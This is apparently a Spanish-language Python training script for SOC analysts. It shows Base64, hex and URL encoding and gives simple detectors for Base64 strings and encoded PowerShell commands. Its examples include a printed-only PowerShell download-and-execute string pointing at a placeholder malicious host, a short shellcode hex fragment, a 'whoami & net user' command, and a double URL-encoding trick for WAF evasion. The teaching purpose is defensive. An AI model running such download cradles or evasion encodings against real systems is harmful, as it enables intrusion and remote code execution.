"""
01 — Codificación: Base64 y Hex
================================
Demuestra encoding/decoding y patrones de detección para SOC.
Correlacionado con: Slide 03 de crypto-soc-training.html
                    teoria/01_codificacion.md

Ejecutar: python 01_codificacion.py
Requisitos: ninguno (solo stdlib)
"""

import base64
import binascii
import re


# ─────────────────────────────────────────────
# BASE64
# ─────────────────────────────────────────────

def demo_base64():
    print("=" * 60)
    print("BASE64")
    print("=" * 60)

    texto = "Hola SOC! Este es un payload de prueba."
    print(f"\nInput:   {texto!r}")

    # Codificar
    encoded = base64.b64encode(texto.encode()).decode()
    print(f"Base64:  {encoded}")
    print(f"Longitud original: {len(texto)} bytes")
    print(f"Longitud Base64:   {len(encoded)} chars (~33% más largo)")

    # Decodificar
    decoded = base64.b64decode(encoded).decode()
    print(f"Decoded: {decoded!r}")

    # Ejemplo con payload PowerShell real (ofuscado)
    print("\n--- Ejemplo IOC real: PowerShell -enc ---")
    payload = 'powershell -encoded IEX (New-Object Net.WebClient).DownloadString(\'http://malicious.com/payload\')'
    encoded_payload = base64.b64encode(payload.encode('utf-16-le')).decode()
    print(f"Comando original:\n  {payload}")
    print(f"\nCodificado (como lo verias en un alert):\n  {encoded_payload[:80]}...")

    # Decodificar el payload como PowerShell lo haría
    decoded_payload = base64.b64decode(encoded_payload).decode('utf-16-le')
    print(f"\nDecodificado:\n  {decoded_payload}")


# ─────────────────────────────────────────────
# HEX
# ─────────────────────────────────────────────

def demo_hex():
    print("\n" + "=" * 60)
    print("HEX (Base16)")
    print("=" * 60)

    texto = "SOC"
    print(f"\nInput: {texto!r}")

    # Codificar a hex
    hex_str = texto.encode().hex()
    hex_upper = hex_str.upper()
    print(f"Hex:   {hex_str}")
    print(f"Hex (mayúsculas): {hex_upper}")

    # Con prefijo \x (formato shellcode)
    shellcode_fmt = ''.join(f'\\x{b:02x}' for b in texto.encode())
    print(f"Formato shellcode: {shellcode_fmt}")

    # Decodificar
    decoded = bytes.fromhex(hex_str).decode()
    print(f"Decoded: {decoded!r}")

    # Ejemplo: shellcode simple (NOP sled)
    print("\n--- Ejemplo: identificar shellcode en hex ---")
    nop_sled = "909090909090" + "4831c04831ff4831f64831d24831ed"
    print(f"Hex sospechoso: {nop_sled}")
    decoded_bytes = bytes.fromhex(nop_sled)
    print(f"Bytes: {decoded_bytes}")
    print(f"¿Empieza con NOPs (0x90)? {'Sí' if decoded_bytes[0] == 0x90 else 'No'}")


# ─────────────────────────────────────────────
# URL ENCODING
# ─────────────────────────────────────────────

def demo_url_encoding():
    print("\n" + "=" * 60)
    print("URL ENCODING")
    print("=" * 60)

    from urllib.parse import quote, unquote

    payload = "cmd.exe /c whoami & net user"
    encoded = quote(payload)
    print(f"\nOriginal: {payload}")
    print(f"URL enc:  {encoded}")
    print(f"Decoded:  {unquote(encoded)}")

    # Doble encoding (evasión de WAF)
    double_encoded = quote(quote(payload))
    print(f"\nDoble encoding (evasión WAF): {double_encoded[:50]}...")


# ─────────────────────────────────────────────
# DETECCIÓN: ¿Esto es Base64?
# ─────────────────────────────────────────────

def es_base64(s: str) -> bool:
    """
    Heurística para detectar si un string podría ser Base64.
    No infalible — usar como primer filtro.
    """
    # Limpiar whitespace
    s = s.strip()
    # Longitud mínima
    if len(s) < 8:
        return False
    # Solo caracteres Base64 válidos
    patron = re.compile(r'^[A-Za-z0-9+/]*={0,2}$')
    if not patron.match(s):
        return False
    # Longitud múltiplo de 4
    if len(s) % 4 != 0:
        return False
    # Intentar decodificar
    try:
        base64.b64decode(s)
        return True
    except Exception:
        return False


def demo_deteccion():
    print("\n" + "=" * 60)
    print("DETECCIÓN: ¿Es Base64?")
    print("=" * 60)

    muestras = [
        ("SG9sYSBTT0M=", True),
        ("d41d8cd98f00b204e9800998ecf8427e", False),  # MD5 — parece hex
        ("Hello World", False),
        ("cG93ZXJzaGVsbA==", True),  # "powershell"
        ("TVqQAAMAAAAEAAAA", True),   # MZ header (PE file) en Base64
        ("AAAA", True),              # Base64 válido pero trivial
        ("notbase64!!", False),
    ]

    for muestra, esperado in muestras:
        resultado = es_base64(muestra)
        estado = "✓" if resultado == esperado else "✗"
        print(f"{estado} {muestra[:30]:<30} → {'Base64' if resultado else 'NO Base64'}")

    print("\n--- Detección de payload PowerShell con -enc ---")
    comandos = [
        "powershell -enc SQBFAFgA",
        "powershell -ExecutionPolicy Bypass -File script.ps1",
        "powershell.exe -EncodedCommand aQBlAHgA",
        "notepad.exe C:\\test.txt",
    ]
    patron_enc = re.compile(r'powershell.*(-enc|-encodedcommand)\s+([A-Za-z0-9+/=]+)', re.IGNORECASE)
    for cmd in comandos:
        match = patron_enc.search(cmd)
        if match:
            payload_b64 = match.group(2)
            try:
                decoded = base64.b64decode(payload_b64).decode('utf-16-le', errors='replace')
                print(f"⚠️  ALERT: {cmd[:50]}")
                print(f"   Decoded: {decoded[:60]}")
            except Exception:
                print(f"⚠️  ALERT (no decodificable): {cmd[:50]}")
        else:
            print(f"   OK: {cmd[:50]}")


# ─────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────

if __name__ == "__main__":
    demo_base64()
    demo_hex()
    demo_url_encoding()
    demo_deteccion()

    print("\n" + "=" * 60)
    print("REFERENCIA RÁPIDA:")
    print("  base64.b64encode(bytes) → encoded")
    print("  base64.b64decode(string) → bytes")
    print("  bytes.fromhex(hex_str) → bytes")
    print("  bytes.hex() → hex string")
    print("  CyberChef online: https://gchq.github.io/CyberChef/")
    print("=" * 60)
